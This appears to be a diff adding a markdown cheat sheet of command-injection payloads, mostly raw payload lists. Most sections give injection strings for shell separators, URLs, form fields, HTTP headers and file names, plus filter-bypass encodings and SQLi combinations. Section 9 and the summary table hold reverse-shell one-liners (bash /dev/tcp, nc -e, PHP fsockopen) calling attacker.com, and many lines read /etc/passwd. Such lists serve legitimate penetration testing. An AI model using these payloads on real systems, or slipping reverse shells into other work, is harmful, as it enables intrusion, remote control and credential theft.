@@ -1,0 +1,278 @@
+# 🛠️ **Command Injection Payloads (Complete List)**
+
+---
+
+## 1. **Basic Command Injection Payloads**
+
+### **Shell Command Execution**
+```
+; ls
+; id
+; whoami
+; uname -a
+; cat /etc/passwd
+; touch /tmp/testfile
+; echo "test" > /tmp/testfile
+; rm -rf /tmp/testfile
+```
+
+### **Chaining Commands with Semicolon**
+```
+; echo "test"
+; ls /var/www
+; id; uname -a
+```
+
+---
+
+## 2. **Using Logical Operators for Command Chaining**
+
+### **OR Operator (||)**
+```
+|| ls
+|| id
+|| whoami
+|| uname -a
+|| echo "test" > /tmp/testfile
+|| rm -rf /tmp/testfile
+```
+
+### **AND Operator (&&)**
+```
+&& ls
+&& id
+&& whoami
+&& uname -a
+&& echo "test" > /tmp/testfile
+&& rm -rf /tmp/testfile
+```
+
+---
+
+## 3. **Redirecting Output to Files**
+
+### **Redirecting Output Using `>`**
+```
+> /tmp/output.txt
+> /dev/null
+> /tmp/testfile
+> /tmp/output.txt; echo "Test" > /tmp/output.txt
+```
+
+### **Appending Output Using `>>`**
+```
+>> /tmp/output.txt
+>> /dev/null
+>> /tmp/testfile
+```
+
+---
+
+## 4. **System Commands in URLs**
+
+### **Injecting Commands in URLs**
+```
+http://example.com/page?name=test; ls
+http://example.com/page?name=test; cat /etc/passwd
+http://example.com/page?name=test; id
+```
+
+---
+
+## 5. **Using Piping (`|`) to Chain Commands**
+
+### **Command Piping to Extract Information**
+```
+| cat /etc/passwd
+| ls | grep test
+| uname -a | more
+| whoami | awk '{print $1}'
+```
+
+---
+
+## 6. **Using Input Fields to Inject Commands**
+
+### **Query Parameter Example**
+```
+?q=; ls
+?q=; whoami
+?q=; id
+?q=; uname -a
+```
+
+### **POST Data Example**
+```json
+{
+  "name": "; ls"
+}
+```
+
+---
+
+## 7. **Using `$(command)` or Backticks for Command Execution**
+
+### **Backticks (`)**
+```
+`ls`
+`id`
+`whoami`
+`uname -a`
+`cat /etc/passwd`
+```
+
+### **Command Substitution (`$()`)**
+```
+$(ls)
+$(id)
+$(whoami)
+$(uname -a)
+$(cat /etc/passwd)
+```
+
+---
+
+## 8. **Injecting into HTTP Headers**
+
+### **Injecting Command into HTTP Headers**
+```
+X-Forwarded-For: 127.0.0.1; ls
+X-Requested-With: ; whoami
+User-Agent: Mozilla/5.0; uname -a
+```
+
+---
+
+## 9. **Web Shells or Reverse Shell Payloads**
+
+### **Reverse Shell (Bash)**
+```
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+; nc -e /bin/bash attacker.com 4444
+```
+
+### **PHP Reverse Shell**
+```
+; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
+```
+
+---
+
+## 10. **Path Traversal with Command Injection**
+
+### **Path Traversal Injection**
+```
+; cat ../../../../etc/passwd
+; ls ../../../../../etc
+```
+
+---
+
+## 11. **Command Injection in File Uploads**
+
+### **Injecting Commands in File Name**
+```
+file=photo.jpg; ls
+file=photo.jpg; id
+file=photo.jpg; uname -a
+```
+
+---
+
+## 12. **Payloads for Specific System Commands**
+
+### **Linux/Unix-Based Systems**
+```
+; ls -l
+; ps aux
+; df -h
+; uname -r
+; netstat -tuln
+```
+
+### **Windows-Based Systems**
+```
+; dir
+; ipconfig
+; systeminfo
+; net user
+```
+
+---
+
+## 13. **Bypassing Filters or WAFs**
+
+### **Bypassing Filters with Encodings**
+```
+; %24%28id%29
+; %3B%20id
+; %3B%20ls
+```
+
+### **Bypassing Filters with Alternate Syntax**
+```
+; $(id)
+; `id`
+; || echo "test"
+; && echo "test"
+```
+
+---
+
+## 14. **Testing with Command Injection in Scripts**
+
+### **Injecting Commands into Shell Scripts**
+```
+# myscript.sh
+name="test; ls"
+echo $name
+```
+
+---
+
+## 15. **SQL Injection Combined with Command Injection**
+
+### **Combining SQLi with Command Injection**
+```
+' OR 1=1; ls
+' UNION SELECT username, password FROM users; cat /etc/passwd
+' OR 1=1; uname -a
+```
+
+---
+
+## 16. **Advanced Payloads for Special Contexts**
+
+### **Null Byte Injection (`%00`)**
+```
+; ls%00
+; cat /etc/passwd%00
+```
+
+### **Using `exec()` (PHP or similar environments)**
+```
+; exec("ls")
+; exec("id")
+; exec("whoami")
+```
+
+---
+
+# 🧾 Summary Table for Command Injection Payloads
+
+| Category                  | Payload Example                                      |
+|---------------------------|------------------------------------------------------|
+| Basic Command Execution   | `; id`, `; ls`, `; whoami`                           |
+| Logical Operators (OR/AND)| `|| ls`, `&& uname -a`                              |
+| Output Redirection        | `> /tmp/output.txt`, `>> /tmp/testfile`              |
+| URL Command Injection     | `http://example.com?name=test; ls`                   |
+| Piping Commands           | `| cat /etc/passwd`, `| ls | grep test`              |
+| Command Substitution      | `$(ls)`, ``id``                                      |
+| HTTP Header Injection     | `X-Forwarded-For: 127.0.0.1; ls`                     |
+| Reverse Shell             | `; bash -i >& /dev/tcp/attacker.com/4444 0>&1`       |
+| Path Traversal            | `; cat ../../../../etc/passwd`                       |
+| File Upload Injection     | `file=photo.jpg; ls`                                 |
+| Linux Commands            | `; ps aux`, `; df -h`                                |
+| Windows Commands          | `; dir`, `; ipconfig`                                |
+| Filter Bypass             | `; %24%28id%29`, `; %3B%20ls`                        |
+
